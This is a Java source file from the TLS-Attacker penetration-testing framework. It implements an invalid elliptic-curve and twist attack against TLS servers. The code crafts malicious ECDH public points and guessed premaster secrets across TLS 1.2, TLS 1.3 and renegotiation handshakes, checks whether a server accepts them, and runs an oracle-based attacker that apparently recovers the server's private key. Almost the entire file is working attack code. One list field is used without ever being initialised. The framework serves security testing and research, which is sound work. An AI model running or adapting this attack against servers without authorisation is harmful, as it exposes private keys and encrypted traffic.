/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
import de.rub.nds.tlsattacker.core.crypto.ec.FieldElementFp;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.core.crypto.ec.PointFormatter;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.extension.ExtensionMessage;
import de.rub.nds.tlsattacker.core.protocol.message.extension.KeyShareExtensionMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

/**
 *
 */
public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private BigInteger premasterSecret;
    
    private List<ResponseFingerprint> responseFingerprints;
    
    private List<Point> receivedEcPublicKeys;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public InvalidCurveAttacker(InvalidCurveAttackConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = getTlsConfig();
        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup()
                .name());
        EllipticCurve curve = CurveFactory.getCurve(tlsConfig.getDefaultSelectedNamedGroup());
        RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
                tlsConfig.getDefaultSelectedNamedGroup());
        BigInteger result = attacker.attack();
        LOGGER.info("Result found: {}", result);
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        if (!AlgorithmResolver.getKeyExchangeAlgorithm(getTlsConfig().getDefaultSelectedCipherSuite()).isEC()) {
            LOGGER.info("The CipherSuite that should be tested is not an Ec one:"
                    + getTlsConfig().getDefaultSelectedCipherSuite().name());
            return null;
        }
        responseFingerprints = new LinkedList<>();
        
        EllipticCurve curve;
        if(config.isCurveTwistAttack()) {
            curve = config.getTwistedCurve();
        }
        else {
            curve = CurveFactory.getCurve(config.getNamedGroup());
        }
        Point point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
                config.getNamedGroup());
        for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
            if (config.getPremasterSecret() != null) {
                premasterSecret = config.getPremasterSecret();
            } else {
                Point sharedPoint = curve.mult(new BigInteger("" + (i + 1)), point);          
                if (sharedPoint.getX() == null) {
                    premasterSecret = BigInteger.ZERO;
                }
                else { 
                    premasterSecret = sharedPoint.getX().getData();
                    if(config.isCurveTwistAttack()) {
                        // transform back from simulated x-only ladder
                        premasterSecret = premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus())).mod(curve.getModulus());
                    }
                }
                LOGGER.debug("PMS: " + premasterSecret.toString());
            }
            try {
                WorkflowTrace trace = executeProtocolFlow();                             
                if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace) && getTlsConfig().getHighestProtocolVersion() != ProtocolVersion.TLS13) {
                    LOGGER.info("Did not receive ServerHello. Check your config");

                    return null;
                }
                if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) { 
                    LOGGER.info("Received no finished Message in Protocolflow:" + i);
                } else {
                    LOGGER.info("Received a finished Message in Protocolflow: " + i + "! Server is vulnerable!");
                    return true;
                }
            } catch (WorkflowExecutionException ex) {
                LOGGER.warn(ex);
            }
        }
        return false;
    }

    private WorkflowTrace executeProtocolFlow() {
        Config tlsConfig = getTlsConfig();
        
        
        EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
        ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()), new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
        byte[] serialized = PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint, config.getPointCompressionFormat());
        serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
        
        WorkflowTrace trace;
        if(config.isAttackInRenegotiation())
        {
            trace = prepareRenegotiationTrace(serializedPublicKey, pms, explicitPMS);
        }
        else
        {
            trace = prepareRegularTrace(serializedPublicKey, pms, explicitPMS);
        }
        LOGGER.info("Working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
        
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        
        responseFingerprints.add(ResponseExtractor.getFingerprint(state)); 
        if(state.getTlsContext().getServerEcPublicKey() != null)
        {
            getReceivedEcPublicKeys().add(state.getTlsContext().getServerEcPublicKey()); 
        }
        return trace;
    }
    
    private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
    {
       Config tlsConfig = getTlsConfig();
       WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                RunningModeType.CLIENT);
       if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
        {
            trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig)));
            trace.addTlsAction(new SendAction(new FinishedMessage(tlsConfig)));
            ClientHelloMessage cHello = (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_HELLO, trace); 
            KeyShareExtensionMessage ksExt;
            for(ExtensionMessage ext : cHello.getExtensions())
            {
                if(ext instanceof KeyShareExtensionMessage)
                {
                    ksExt = (KeyShareExtensionMessage)ext;
                    ksExt.getKeyShareList().get(0).setPublicKey(serializedPublicKey); //we use exactly one key share
                }
            }    
            
            //TODO: use action / modification to influence key derivation for TLS 1.3
            getTlsConfig().setDefaultPreMasterSecret(explicitPMS);
        }
        else
        {
            trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
                tlsConfig), new FinishedMessage(tlsConfig)));
            trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
            
            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace); 
            message.setPublicKey(serializedPublicKey);
            message.prepareComputations();
            message.getComputations().setPremasterSecret(pms);
        }
       
       return trace;
    }
    
    private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
    {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION,
                RunningModeType.CLIENT);
        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage)WorkflowTraceUtil.getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
        message.setPublicKey(serializedPublicKey);
        message.prepareComputations();
        message.getComputations().setPremasterSecret(pms);
        
        return trace;
    }

    /**
     * @return the responseFingerprints
     */
    public List<ResponseFingerprint> getResponseFingerprints() {
        return responseFingerprints;
    }

    /**
     * @param responseFingerprints the responseFingerprints to set
     */
    public void setResponseFingerprints(List<ResponseFingerprint> responseFingerprints) {
        this.responseFingerprints = responseFingerprints;
    }

    /**
     * @return the receivedEcPublicKeys
     */
    public List<Point> getReceivedEcPublicKeys() {
        return receivedEcPublicKeys;
    }
}
